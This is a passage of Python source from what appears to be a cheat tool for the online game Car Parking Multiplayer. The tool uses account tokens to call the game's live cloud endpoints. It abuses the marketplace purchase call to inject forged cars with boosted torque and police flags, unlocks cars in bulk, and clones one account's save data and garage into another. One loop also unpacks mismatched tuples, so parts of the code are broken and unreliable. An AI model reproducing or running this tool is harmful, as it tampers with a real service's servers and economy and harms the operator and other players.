        _fl[4] = 1800.0         # 最大扭矩转速
    _car['floats'] = _fl
    _car['dataVersion'] = 2
    _car['engineID'] = 5
    _car['cdi'] = True
    _car['isLocked'] = False
    _car['torque'] = float(nm)
    _car['brake'] = 3000.0
    _car['mass'] = 1100.0
    _car['police'] = True
    # genID 用自己号前缀
    _inst = '%s_%d_HZ' % (_u8, cid)
    _tx = _car.get('texts')
    if isinstance(_tx, list):
        while len(_tx) < 3:
            _tx.append('')
        _tx[2] = _inst
    else:
        _car['texts'] = ['', '', _inst, '']
    if isinstance(_car.get('Vynils'), dict):
        _car['Vynils']['CarID'] = cid
    for _ld in ('BoughtParts', 'typeToInstall'):
        _lv = _car.get(_ld)
        if isinstance(_lv, list) and len(_lv) < 8:
            return {'ok': False, 'message': '模板数据异常，请重试'}

    # 4) 走买入通道
    _pay = {
        'ownerID': _slot.get('ownerID', ''),
        'ownerName': _slot.get('ownerName', ''),
        'description': _slot.get('description', ''),
        'CarID': _slot.get('carID', 0),
        'carGeneratedID': _slot.get('carGeneratedID', ''),
        'ownerAccountID': _slot.get('ownerAccountID', ''),
        'oneCar': _car,
        'vynilOneCar': _car.get('Vynils', {}),
        'loadedLocalCar': {'instanceID': -100000 - cid},
        'price': _slot.get('price', 100),
        'SellingCar': {},
        'willReject': False,
        'dislike': 1,
        'like': 0,
        'liked': False,
        'disliked': False,
        'mode': 1,
    }
    try:
        _pr = http_post(_base + 'WSPurchaseCarV3', {'data': json.dumps(_pay, ensure_ascii=False)},
                        headers=_hdr, timeout=45)
    except Exception as e:
        return {'ok': False, 'message': '请求异常：%s' % str(e)[:60]}
    _prv = _pr.get('result') if isinstance(_pr, dict) else None
    if str(_prv) not in ('1', '2', '6', '14'):
        return {'ok': False, 'message': '服务器拒绝（结果 %s）' % str(_prv)[:20]}
    # 5) 回读验证
    time.sleep(1.5)
    try:
        _after = _car_fetch_all(c, timeout=45) or []
        for _x in _after:
            if int(_x.get('CarID') or 0) == cid:
                _g = ''
                _t = _x.get('texts')
                if isinstance(_t, list) and len(_t) >= 3:
                    _g = str(_t[2] or '')
                _f = _x.get('floats')
                if _g.startswith(_u8) and isinstance(_f, list) and len(_f) >= 4:
                    return {'ok': True, 'carId': cid, 'name': CARS_CN.get(cid, str(cid)),
                            'hp': _f[1], 'nm': _f[3], 'genId': _g,
                            'message': '已写入 %s：%s 马力 / %s 牛米' % (CARS_CN.get(cid, cid), _f[1], _f[3])}
    except Exception:
        pass
    return {'ok': True, 'carId': cid, 'hp': hp, 'nm': nm,
            'message': '已提交（%s 马力 / %s 牛米），登录游戏查看' % (hp, nm)}


def _car_inject_one(c, cid, lids):
    """给账号 c 注入 CarID=cid 的车。
    关键：市场通道买的是"槽那辆挂牌车"，车型由槽决定，
    所以只在市场里挑 carID==cid 的槽来买；买完以 GetAllCars2 事实验收。"""
    car = _car_make_one(c, cid, lids)
    if car is None:
        return (False, '模板错误')
    _slots = _car_fetch_slots(c, 20)
    _match = [s for s in _slots if int(s.get('carID') or 0) == cid]
    _match.sort(key=lambda s: 1 if str(s.get('lockedBy') or '') else 0)
    if not _match:
        return (False, '市场暂无该车型挂牌')
    for _i, _slot in enumerate(_match[:2]):
        ok1, _note = _car_buy_slot(c, car, _slot, cid)
        # 不看响应码，直接核对事实
        _hh = _car_have_set(c)
        if _hh is not None and cid in _hh:
            return (True, '')
        if _i == 0:
            try:
                time.sleep(0.6)
            except Exception:
                pass
    return (False, '购买后未入库')


def _car_inject_old(c, cid, lids):
    """旧的盲打版本（保留备用）。"""
    try:
        raw = base64.b64decode(CAR_TPL_B64).decode('utf-8')
        car = json.loads(raw.replace('replacecar', str(cid)).replace('replaceid', lids))
    except Exception:
        return (False, '模板错误')
    car['engineID'] = 5
    car['cdi'] = True
    car['isLocked'] = False
    car['torque'] = 3000.0
    car['brake'] = 3000.0
    car['mass'] = 1100.0
    _ws = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3'
    _wp = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3'
    _hdr = {'Authorization': 'Bearer ' + (c.token or '')}
    for _try in range(2):
        _slot = None
        try:
            _sr = http_post(_ws, {'data': 20}, headers=_hdr, timeout=25)
            _sv = _sr.get('result') if isinstance(_sr, dict) else None
            for _u in range(2):
                if isinstance(_sv, str):
                    try:
                        _sv = json.loads(_sv)
                    except Exception:
                        break
            if isinstance(_sv, list):
                for _sl in _sv:
                    if isinstance(_sl, dict) and int(_sl.get('carID') or 0) == 0:
                        _slot = _sl
                        break
                if _slot is None and _sv:
                    _slot = _sv[0]
        except Exception:
            _slot = None
        if isinstance(_slot, dict):
            _pay = {
                'ownerID': _slot.get('ownerID', ''),
                'ownerName': _slot.get('ownerName', ''),
                'description': _slot.get('description', ''),
                'CarID': (cid if False else _slot.get('carID', 0)),
                'carGeneratedID': _slot.get('carGeneratedID', ''),
                'ownerAccountID': _slot.get('ownerAccountID', ''),
                'oneCar': car,
                'vynilOneCar': car.get('Vynils', {}),
                'loadedLocalCar': {'instanceID': -100000 - cid},
                'price': _slot.get('price', 100),
                'SellingCar': {},
                'willReject': False,
                'dislike': 1,
                'like': 0,
                'liked': False,
                'disliked': False,
                'mode': 1,
            }
            try:
                _pr = http_post(_wp, {'data': json.dumps(_pay, ensure_ascii=False)}, headers=_hdr, timeout=40)
                _prv = _pr.get('result') if isinstance(_pr, dict) else None
                if str(_prv) == '1':
                    return (True, '')
            except Exception:
                pass
        try:
            time.sleep(0.8)
        except Exception:
            pass
    return (False, '注入被拒')


def _cunlock_run(jid, sid, start=1, end=273):
    try:
        c = get_session(sid)
        if not c or not c.record:
            _cunlock_update(jid, finished=True, error='账号会话已失效，请重新登录后再试')
            return
        if not c.get_auth():
            _cunlock_update(jid, finished=True, error='登录状态失效，请重新登录')
            return

        _lids = str(c.record.get('localID') or '') or (c.uid or '')[:8]
        _all_targets = list(range(start, end + 1))

        _cunlock_update(jid, message='读取现有车辆…')
        _cars0 = _car_fetch_all(c)
        if _cars0 is None:
            _cunlock_update(jid, finished=True, error='读取车辆列表失败，请重试')
            return
        _tpl = _car_pick_template(_cars0)
        if not _tpl:
            _cunlock_update(jid, finished=True, error='账号里没有可当模板的车（至少要有 1 辆）')
            return
        _tpl_id = int(_tpl.get('CarID') or 0)
        _have = set(int(x.get('CarID') or 0) for x in _cars0)
        _cunlock_update(jid, total=len(_all_targets), skipped=len(_have),
                        message='模板车 %d；已有 %d 辆；目标 %d 辆' % (_tpl_id, len(_have), len(_all_targets)))

        _ok = 0
        _fail_note = {}
        _tried = set()
        _rounds = 0
        _MAX_PASS = 60
        _last_count = len(_have)

        while _rounds < _MAX_PASS:
            _miss = [x for x in _all_targets if x not in _have]
            if not _miss:
                break
            _slots = _car_fetch_slots(c, 20)
            if not _slots:
                _rounds += 1
                try:
                    time.sleep(2.0)
                except Exception:
                    pass
                continue
            _rounds += 1
            # PATCH41：槽必须与目标车型匹配（槽绑定具体 carID）。
            # 旧逻辑「一槽对一车」是按顺序硬凑，车型对不上 → 全部返回 1（VehicleNotFound）。
            _by_cid = {}
            for _s in _slots:
                _sc = int(_s.get('carID') or 0)
                if _sc > 0:
                    _by_cid.setdefault(_sc, []).append(_s)
            _free_slots = [x for x in _slots if int(x.get('carID') or 0) == 0]
            _batch = []
            for _cid in _miss:
                if _cid in _by_cid and _by_cid[_cid]:
                    _batch.append((_cid, _by_cid[_cid].pop(0)))
                elif _free_slots:
                    _batch.append((_cid, _free_slots.pop(0)))
            _cunlock_update(jid, message='第%d轮：缺 %d 辆，匹配到 %d 个可用槽' % (_rounds, len(_miss), len(_batch)))
            if not _batch:
                try:
                    time.sleep(2.0)
                except Exception:
                    pass
                continue
            for _i, (_cid, _slot) in enumerate(_batch):
                _ok1, _note = make_car_via_template(c, _tpl, _lids, _cid, _slot)
                _tried.add(_cid)
                if _ok1:
                    _ok += 1
                    _have.add(_cid)
                    _fail_note.pop(_cid, None)
                else:
                    _fail_note[_cid] = _note or '注入被拒'
                _cunlock_update(jid, done=len(_tried), ok=_ok, current=_cid,
                                message='第%d轮 %d/%d：车型 %d %s' % (_rounds, _i + 1, len(_batch), _cid, '✓' if _ok1 else '✗'))
                try:
                    time.sleep(0.45)
                except Exception:
                    pass
            # 轮末对账
            _hh = _car_have_set(c)
            if _hh is not None:
                _have = _hh
            if len(_have) <= _last_count:
                _rounds += 1
                try:
                    time.sleep(1.5)
                except Exception:
                    pass
            _last_count = len(_have)
            _cunlock_update(jid, message='第%d轮结束：已拥有 %d / %d' % (_rounds, len(_have), len(_all_targets)))
            try:
                time.sleep(0.6)
            except Exception:
                pass

        _final = _car_have_set(c)
        if _final is not None:
            _have = _final
        _fail = [x for x in _all_targets if x not in _have]
        _notes = {}
        for _cid in _fail[:80]:
            _notes[str(_cid)] = _fail_note.get(_cid, '未能造出')
        _cunlock_update(jid, finished=True,
                        message='完成：已拥有 %d / %d，缺 %d（共 %d 轮）' % (len(_have), len(_all_targets), len(_fail), _rounds),
                        failed_list=_fail[:80],
                        failed_notes=_notes,
                        result={'ok': len(_have), 'total': len(_all_targets), 'fail': len(_fail), 'rounds': _rounds})
    except Exception as e:
        _cunlock_update(jid, finished=True, error='异常：%s' % str(e)[:120])
# ===== 全车解锁 END =====

_CLONE_JOBS = {}


def _clone_new_job():
    jid = secrets.token_hex(8)
    with _KEY_LOCK:
        _CLONE_JOBS[jid] = {'phase': '准备', 'message': '准备中…', 'done': 0, 'total': 6,
                            'vehicles': 0, 'finished': False, 'result': None, 'error': '',
                            'created': int(time.time())}
        if len(_CLONE_JOBS) > 30:
            olds = sorted(_CLONE_JOBS.items(), key=lambda kv: kv[1].get('created') or 0)
            for k, _ in olds[:-20]:
                _CLONE_JOBS.pop(k, None)
    return jid


def _clone_job_update(jid, **kw):
    with _KEY_LOCK:
        j = _CLONE_JOBS.get(jid)
        if j:
            j.update(kw)


def _clone_run(jid, src_sid, dst_email, dst_password, opts):
    try:
        _clone_job_update(jid, phase='读取源存档', message='读取源账号存档…')
        src = get_session(src_sid)
        if not src or not src.record:
            _clone_job_update(jid, finished=True, error='源会话已失效，请重新登录后再试')
            return
        if not src.load():
            _clone_job_update(jid, finished=True, error='源账号存档刷新失败，请重试')
            return
        _clone_job_update(jid, phase='登录目标账号', message='登录目标账号…')
        dst = Client()
        lr = dst.login(dst_email, dst_password)
        if not lr.get('ok'):
            _clone_job_update(jid, finished=True, error='目标账号登录失败：' + str(lr.get('message') or ''))
            return
        _dst_fresh = False
        if not dst.load():
            _probe_raw = None
            try:
                _probe_raw = http_post(URL_GET, {'data': None}, headers={'Authorization': 'Bearer ' + (dst.token or '')})
            except Exception:
                _probe_raw = None
            if not isinstance(_probe_raw, dict):
                _clone_job_update(jid, finished=True, error='目标账号状态检测失败（网络），请重试')
                return
            _probe_res = _probe_raw.get('result')
            if _probe_res:
                _clone_job_update(jid, finished=True, error='目标账号存档读取失败（已有档案但解析异常），请重试或反馈')
                return
            dst.original = {}
            dst.record = {}
            _dst_fresh = True
            _clone_job_update(jid, message='目标账号为空档新号 → 直接创建档案（无需先登录游戏）')
        rec = json.loads(json.dumps(src.record, ensure_ascii=False))
        if not opts.get('clone_id'):
            if _dst_fresh:
                rec.pop('localID', None)
            else:
                rec['localID'] = dst.record.get('localID') or rec.get('localID')
        if not opts.get('clone_name'):
            rec['Name'] = dst.record.get('Name') or rec.get('Name')
        orig0 = json.loads(json.dumps(dst.original, ensure_ascii=False))
        _SRC_CARS_CACHE = [None]   # 源号车库缓存（只读一次，后续复用）
        SEGS = [
            ('货币', ['money', 'coin', 'Name']),
            ('车辆数据', ['carIDnStatus']),
            ('车辆其他', ['fcar', 'boughtFsos', 'integers']),
            ('改装数据', ['allData']),
            ('属性集合', ['floats']),
            ('警灯警笛', ['boughtPoliceLights', 'boughtPoliceSirens']),
            ('车牌涂装', ['platesData']),
        ]
        _clone_job_update(jid, total=len(SEGS), done=0, message='开始写入…')
        seg_rows = []
        ok_n = 0
        vn_src = 0
        try:
            _cids0 = rec.get('carIDnStatus') or {}
            _gen0 = (_cids0.get('carGeneratedIDs') or []) if isinstance(_cids0, dict) else []
            vn_src = len([x for x in _gen0 if str(x)])
        except Exception:
            vn_src = 0
        for seg_name, seg_fields in SEGS:
            if seg_name == '车辆数据':
                _clone_job_update(jid, phase=seg_name, message='写入车辆数据（共 %d 辆）…' % vn_src, vehicles=vn_src)
            else:
                _clone_job_update(jid, phase=seg_name, message='写入：%s…' % seg_name)
            okseg = False
            seg_note = ''
            try:
                seg_size = len(json.dumps({f: rec.get(f) for f in seg_fields}, ensure_ascii=False))
            except Exception:
                seg_size = -1
            try:
                rr = dst._send(rec, orig0, seg_fields)
                okseg = bool(rr.get('ok'))
            except Exception:
                okseg = False
            if not okseg and seg_name == '车辆数据':
                # Plan B：把 genID 前缀改写为 B 号自己的 uid 前缀后重试
                try:
                    _cids = rec.get('carIDnStatus') or {}
                    _gen = list(_cids.get('carGeneratedIDs') or []) if isinstance(_cids, dict) else []
                    _pref = (dst.uid or '')[:8].upper()
                    if _pref and _gen:
                        _newgen = []
                        for _g in _gen:
                            _s = str(_g or '')
                            _i = _s.find('_')
                            _newgen.append((_pref + _s[_i:]) if (_s and _i >= 0) else _s)
                        _rec2 = json.loads(json.dumps(rec, ensure_ascii=False))
                        _rec2['carIDnStatus'] = {'carGeneratedIDs': _newgen, 'carStatus': _cids.get('carStatus') or []}
                        _rr2 = dst._send(_rec2, orig0, ['carIDnStatus'])
                        if _rr2.get('ok'):
                            okseg = True
                            seg_note = '前缀改写✓'
                        else:
                            seg_note = '前缀改写✗'
                except Exception:
                    pass
            if okseg:
                ok_n += 1
            seg_rows.append([seg_name, okseg, seg_size, seg_note])
            _clone_job_update(jid, done=len(seg_rows), message='完成：%s %s%s' % (seg_name, '✓' if okseg else '✗', ('（' + seg_note + '）') if seg_note else ''))
        # ===== 第 8 阶段：车辆注入（WSPurchaseCarV3 通道）+ 自动补漏 =====
        try:
            _cars_url2 = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2'
            _testcars_url = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/TestGetAllCars'
            _ws_url = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3'
            _wp_url = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3'
            _clone_job_update(jid, phase='车辆注入', total=len(SEGS) + 1, done=len(SEGS), message='读取源号车辆数据…', vehicles=0)

            # PATCH39（关键）：车辆完整记录只能用 TestGetAllCars 拿！
            # GetAllCars2 只给「车库列表条目」——它的 Vynils 是密文、texts 是密文，
            # 用这种数据造出来的车，游戏会存下来但【没有涂装】（竞品源码原话）。
            # TestGetAllCars 一次性返回每辆车的完整记录：Vynils 是明文 dict、texts 是明文 list。
            def _src_cars_full(_tok):
                _out = None
                try:
                    _r = http_post(_testcars_url, {'data': None},
                                   headers={'Authorization': 'Bearer ' + (_tok or '')}, timeout=45)
                    _v = _r.get('result') if isinstance(_r, dict) else None
                    for _u in range(3):
                        if isinstance(_v, str):
                            try:
                                _v = json.loads(_v)
                            except Exception:
                                break
                    if isinstance(_v, list):
                        _out = [x for x in _v if isinstance(x, dict) and int(x.get('CarID') or 0) > 0]
                except Exception:
                    _out = None
                if not _out:
                    try:
                        _r2 = http_post(_cars_url2, {'data': None},
                                        headers={'Authorization': 'Bearer ' + (_tok or '')}, timeout=45)
                        _v2 = _r2.get('result') if isinstance(_r2, dict) else None
                        for _u in range(2):
                            if isinstance(_v2, str):
                                try:
                                    _v2 = json.loads(_v2)
                                except Exception:
                                    break
                        if isinstance(_v2, list):
                            _out = [x for x in _v2 if isinstance(x, dict) and int(x.get('CarID') or 0) > 0]
                    except Exception:
                        _out = None
                return _out or []

            _carlist = _src_cars_full(src.token)
            if _carlist:
                _SRC_CARS_CACHE[0] = _carlist
            _clone_job_update(jid, message='源号 %d 辆车（完整记录），开始注入…' % len(_carlist), vehicles=len(_carlist))
            _uid8 = (dst.uid or '')[:8].upper()
            _inst_pat = re.compile('^' + re.escape(_uid8) + '_(\\d+)_HZ$') if _uid8 else None

            def _fetch_dst_counter():
                _cnt = {}
                try:
                    _er9 = http_post(_cars_url2, {'data': None}, headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=30)
                    _ev9 = _er9.get('result') if isinstance(_er9, dict) else None
                    for _u in range(2):
                        if isinstance(_ev9, str):
                            try:
                                _ev9 = json.loads(_ev9)
                            except Exception:
                                break
                    if isinstance(_ev9, list) and _inst_pat is not None:
                        for _ec9 in _ev9:
                            if not isinstance(_ec9, dict):
                                continue
                            if _ec9.get('police') is True:
                                continue
                            _t9 = _ec9.get('texts')
                            _hit9 = None
                            if isinstance(_t9, list):
                                for _tt9 in _t9:
                                    if isinstance(_tt9, str):
                                        _m9 = _inst_pat.match(_tt9.strip())
                                        if _m9:
                                            _hit9 = int(_m9.group(1))
                                            break
                            elif isinstance(_t9, str):
                                _m9 = _inst_pat.match(_t9.strip())
                                if _m9:
                                    _hit9 = int(_m9.group(1))
                            if _hit9 is not None:
                                _cnt[_hit9] = _cnt.get(_hit9, 0) + 1
                except Exception:
                    return None
                return _cnt

            _dst_have = _car_have_set(dst)
            if _dst_have is None:
                _dst_have = set()
            _prep_cars = []
            _dst_lids = str(dst.record.get('localID') or '') or (dst.uid or '')[:8]
            # PATCH36：照抄开源实现（cpmilija2012-jpg/Gg · cpm1_tool.py）
            # 要点：车数据「原样搬」（含密文），只改 texts[2] 与 Vynils.CarID，
            # 并补上 police=True；不额外做「外观同步」，涂装随注入一次性带过去。
            _uid8p = (dst.uid or '')[:8].upper()
            for _car0 in _carlist:
                try:
                    _car = json.loads(json.dumps(_car0, ensure_ascii=False))
                    _cid = int(_car.get('CarID') or 0)
                    if _cid <= 0:
                        continue
                    _car['police'] = True
                    _car['engineID'] = 5
                    _car['cdi'] = True
                    _car['isLocked'] = False
                    _car['torque'] = 3000.0
                    _car['brake'] = 3000.0
                    _car['mass'] = 1100.0
                    _inst36 = '%s_%d_HZ' % (_uid8p, _cid)
                    _tx36 = _car.get('texts')
                    if isinstance(_tx36, list) and len(_tx36) > 2:
                        _tx36[2] = _inst36
                    elif isinstance(_tx36, str):
                        _car['texts'] = ['', '', _inst36]
                    if isinstance(_car.get('Vynils'), dict):
                        _car['Vynils']['CarID'] = _cid
                    _prep_cars.append((_car, _cid, len(_prep_cars)))
                except Exception:
                    pass
            _pending = [x for x in _prep_cars if x[1] not in _dst_have]
            _skipc = len(_prep_cars) - len(_pending)
            _okc = 0
            _failc = 0
            _rounds_used = 0
            _stall = 0
            _clone_job_update(jid, message='目标已有 %d 个车型，待注入 %d 辆（源 %d 辆）' % (len(_dst_have), len(_pending), len(_prep_cars)))
            _MAX_ROUNDS = 8
            for _rnd in range(1, _MAX_ROUNDS + 1):
                if not _pending:
                    break
                _rounds_used = _rnd
                _round_ok = 0
                _round_fail = []
                _tot = len(_pending)
                for _pi, (_pcar, _pcid2, _pidx2, _pgi2) in enumerate(_pending):
                    _st = 'fail'
                    try:
                        if _pcid2 in _dst_have:
                            _st = 'skip'
                        else:
                            _slot = None
                            try:
                                _sr = http_post(_ws_url, {'data': 20}, headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=25)
                                _sv = _sr.get('result') if isinstance(_sr, dict) else None
                                for _u in range(2):
                                    if isinstance(_sv, str):
                                        try:
                                            _sv = json.loads(_sv)
                                        except Exception:
                                            break
                                if isinstance(_sv, list):
                                    # 优先挑"未被锁定"的槽
                                    _free = [x for x in _sv if isinstance(x, dict) and not str(x.get('lockedBy') or '')]
                                    _cn = [x for x in _sv if isinstance(x, dict) and int(x.get('carID') or 0) == 0]
                                    if _cn:
                                        _slot = _cn[0]
                                    elif _free:
                                        _slot = _free[0]
                                    elif _sv:
                                        _slot = _sv[0]
                            except Exception:
                                _slot = None
                            if not isinstance(_slot, dict):
                                _st = 'fail'
                            else:
                                # 用新引擎：以源车为模板，注入到目标号
                                _k1, _knote = make_car_via_template(dst, _pcar, _uid8, _pcid2, _slot)
                                if _k1:
                                    _st = 'ok'
                                else:
                                    _st = 'fail'
                                    if _knote:
                                        _clone_job_update(jid, message='车型%s 注入失败：%s' % (_pcid2, str(_knote)[:60]))
                    except Exception:
                        _st = 'fail'
                    if _st == 'ok':
                        _okc += 1
                        _round_ok += 1
                        _dst_have.add(_pcid2)
                    elif _st == 'skip':
                        _skipc += 1
                    else:
                        _round_fail.append((_pcar, _pcid2, _pidx2, _pgi2))
                    _clone_job_update(jid, message='车辆注入 第%d轮 %d/%d（成功 %d，跳过 %d，待续 %d）车型%s%s' % (_rnd, _pi + 1, _tot, _okc, _skipc, len(_round_fail), _pcid2, '✓' if _st == 'ok' else ('（已在）' if _st == 'skip' else '✗')))
                    try:
                        time.sleep(0.45 if _st != 'skip' else 0.05)
                    except Exception:
                        pass
                _pending = _round_fail
                if _round_ok == 0:
                    _stall += 1
                else:
                    _stall = 0
                _clone_job_update(jid, message='车辆补漏 第%d轮结束：本轮成功 %d，仍待补 %d' % (_rnd, _round_ok, len(_pending)))
                if not _pending:
                    break
                if _stall >= 2:
                    _clone_job_update(jid, message='连续无进展，停止补漏（剩余 %d 辆）' % len(_pending))
                    break
                try:
                    time.sleep(1.2)
                except Exception:
                    pass
                _newc = _car_have_set(dst)
                if _newc is not None:
                    _dst_have = _newc
            _failc = len(_pending)
            seg_rows.append(['车辆注入', _okc > 0, _okc, '成功%d/跳过%d/仍缺%d（%d轮）' % (_okc, _skipc, _failc, _rounds_used)])
            if _okc > 0:
                ok_n += 1
            _clone_job_update(jid, done=len(SEGS) + 1, message='车辆注入完成：成功 %d / 跳过 %d / 补漏后仍缺 %d（共 %d 轮）' % (_okc, _skipc, _failc, _rounds_used))
        except Exception as _ce:
            _clone_job_update(jid, message='车辆注入异常：%s' % str(_ce)[:120])
        # ===== 第 9 阶段：外观同步（SaveCarsPartially8 写入）=====
        try:
            _clone_job_update(jid, phase='外观同步', total=len(SEGS) + 2, done=len(SEGS) + 1, message='读取源号车辆数据…', vehicles=0)
            _fsrc = []
            try:
                if _SRC_CARS_CACHE[0]:
                    _fsrc = _SRC_CARS_CACHE[0]
                else:
                    _f1 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + (src.token or '')}, timeout=30)
                    _f1v = _f1.get('result') if isinstance(_f1, dict) else None
                    for _u in range(2):
                        if isinstance(_f1v, str):
                            try:
                                _f1v = json.loads(_f1v)
                            except Exception:
                                break
                    if isinstance(_f1v, list):
                        _fsrc = [c for c in _f1v if isinstance(c, dict) and int(c.get('CarID') or 0) > 0]
                        _SRC_CARS_CACHE[0] = _fsrc
            except Exception:
                _fsrc = []
            _fdst = []
            try:
                _f2 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=30)
                _f2v = _f2.get('result') if isinstance(_f2, dict) else None
                for _u in range(2):
                    if isinstance(_f2v, str):
                        try:
                            _f2v = json.loads(_f2v)
                        except Exception:
                            break
                if isinstance(_f2v, list):
                    _fdst = [c for c in _f2v if isinstance(c, dict) and int(c.get('CarID') or 0) > 0]
            except Exception:
                _fdst = []
            _fmap = {}
            for _sc in _fsrc:
                _fck = int(_sc.get('CarID') or 0)
                _fmap.setdefault(_fck, []).append(_sc)
            _fuse = {}
            _fneed = []
            for _dc in _fdst:
                _fck2 = int(_dc.get('CarID') or 0)
                _lst = _fmap.get(_fck2) or []
                if _lst:
                    _idx = _fuse.get(_fck2, 0)
                    _fneed.append((_dc, _lst[_idx % len(_lst)]))
                    _fuse[_fck2] = _idx + 1
            _clone_job_update(jid, message='外观同步：待处理 %d 辆（源 %d 辆）' % (len(_fneed), len(_fsrc)), vehicles=len(_fneed))
            _fflds = ['floats', 'vectors', 'gears', 'typeToInstall', 'BoughtParts', 'Vynils', 'WindowVinyls', 'fsoData', 'installedPoliceLights', 'dataVersion']
            _okf = 0
            _fkf = 0
            _retry_fields = []
            _rf_max = 120
            for _i2, (_dcc, _scc) in enumerate(_fneed):
                try:
                    _mcc = json.loads(json.dumps(_dcc, ensure_ascii=False))
                    _anyok = False
                    # PATCH29：恢复 v3-clone7 原样逻辑——直接搬源车字段，
                    # 不做任何解密转换（实测这样涂装是完整正确的）。
                    for _fk in _fflds:
                        try:
                            if _fk not in _scc or _scc.get(_fk) is None:
                                continue
                            _nv = _scc.get(_fk)
                            _ov = _mcc.get(_fk)
                            if json.dumps(_nv, ensure_ascii=False, sort_keys=True) == json.dumps(_ov, ensure_ascii=False, sort_keys=True):
                                continue
                            _mcc[_fk] = _nv
                            _mmp = json.dumps(_mcc, ensure_ascii=False)
                            _wf2 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/SaveCarsPartially8', {'data': _mmp}, headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=25)
                            _wf2v = _wf2.get('result') if isinstance(_wf2, dict) else None
                            if str(_wf2v) == '1':
                                _anyok = True
                            else:
                                try:
                                    if len(_retry_fields) < _rf_max:
                                        _retry_fields.append((json.loads(json.dumps(_mcc, ensure_ascii=False)), _fk))
                                except Exception:
                                    pass
                        except Exception:
                            pass
                        try:
                            time.sleep(0.18)
                        except Exception:
                            pass
                    if _anyok:
                        _okf += 1
                    else:
                        _fkf += 1
                except Exception:
                    _fkf += 1
                _clone_job_update(jid, message='外观同步 %d/%d（成功 %d，失败 %d）车型%s' % (_i2 + 1, len(_fneed), _okf, _fkf, _dcc.get('CarID')))
                try:
                    time.sleep(0.25)
                except Exception:
                    pass
            _rf_ok = 0
            _rf_fail = 0
            if _retry_fields:
                _clone_job_update(jid, message='外观补漏：重试 %d 个失败字段…' % len(_retry_fields))
                for _rc, _rfk in _retry_fields:
                    try:
                        _rmp = json.dumps(_rc, ensure_ascii=False)
                        _rw = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/SaveCarsPartially8', {'data': _rmp}, headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=25)
                        _rwv = _rw.get('result') if isinstance(_rw, dict) else None
                        if str(_rwv) == '1':
                            _rf_ok += 1
                        else:
                            _rf_fail += 1
                    except Exception:
                        _rf_fail += 1
                    try:
                        time.sleep(0.25)
                    except Exception:
                        pass
                _clone_job_update(jid, message='外观补漏完成：修复 %d / 仍失败 %d' % (_rf_ok, _rf_fail))
            _vchk = ''
            try:
                if _fneed:
                    _vkey = None
                    _vcar0 = _fneed[0][0]
                    _t0 = _vcar0.get('texts')
                    if isinstance(_t0, list) and len(_t0) >= 3:
                        _vkey = str(_t0[2])
                    if _vkey:
                        time.sleep(1)
                        _f3 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + (dst.token or '')}, timeout=30)
                        _f3v = _f3.get('result') if isinstance(_f3, dict) else None
                        for _u in range(2):
                            if isinstance(_f3v, str):
                                try:
                                    _f3v = json.loads(_f3v)
                                except Exception:
                                    break
                        _foundcar = None
                        if isinstance(_f3v, list):
                            for _c3 in _f3v:
                                _t3 = _c3.get('texts') if isinstance(_c3, dict) else None
                                if isinstance(_t3, list) and len(_t3) >= 3 and str(_t3[2]) == _vkey:
                                    _foundcar = _c3
                                    break
                        if _foundcar is not None:
                            _srcv = None
                            for _s3, _s3src in _fneed:
                                _ts3 = _s3.get('texts') if isinstance(_s3, dict) else None
                                if isinstance(_ts3, list) and len(_ts3) >= 3 and str(_ts3[2]) == _vkey:
                                    _srcv = _s3src
                                    break
                            _fval = json.dumps(_foundcar.get('floats'), ensure_ascii=False)
                            _sval = json.dumps(_srcv.get('floats'), ensure_ascii=False) if _srcv else ''
                            _eq = (_fval == _sval)
                            _vchk = '首辆回读：%s｜目标头=%s｜源头=%s' % ('一致' if _eq else '不一致', _fval[:46], _sval[:46])
                        else:
                            _vchk = '首辆回读：未找到该车'
            except Exception as _ve3:
                _vchk = '首辆回读异常：%s' % str(_ve3)[:80]
            if _vchk:
                _clone_job_update(jid, message=_vchk)
                seg_rows.append(['外观回读', ('一致' in _vchk and '不一致' not in _vchk), 0, _vchk[:60]])
            seg_rows.append(['外观同步', _okf > 0, _okf, '成功%d/失败%d' % (_okf, _fkf)])
            if _okf > 0:
                ok_n += 1
            _clone_job_update(jid, done=len(SEGS) + 2, message='外观同步完成：成功 %d / 失败 %d' % (_okf, _fkf))
        except Exception as _ce2:
            _clone_job_update(jid, message='外观同步异常：%s' % str(_ce2)[:120])

        # ===== 第 10 阶段：自动补克隆（多轮，直到无缺口）=====
        try:
            _cars_url3 = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2'
            _testcars_url3 = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/TestGetAllCars'
            _ws_url3 = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3'
            _wp_url3 = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3'
            _sv_url3 = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/SaveCarsPartially8'

            # PATCH39：源车完整记录用 TestGetAllCars（其余仍用 GetAllCars2）
            def _pull_cars_full(tok):
                _o = _src_cars_full(tok)
                return _o if _o else None

            def _pull_cars(tok):
                try:
                    _r = http_post(_cars_url3, {'data': None}, headers={'Authorization': 'Bearer ' + (tok or '')}, timeout=45)
                    _v = _r.get('result') if isinstance(_r, dict) else None
                    for _u in range(2):
                        if isinstance(_v, str):
                            try:
                                _v = json.loads(_v)
                            except Exception:
                                break
                    if isinstance(_v, list):
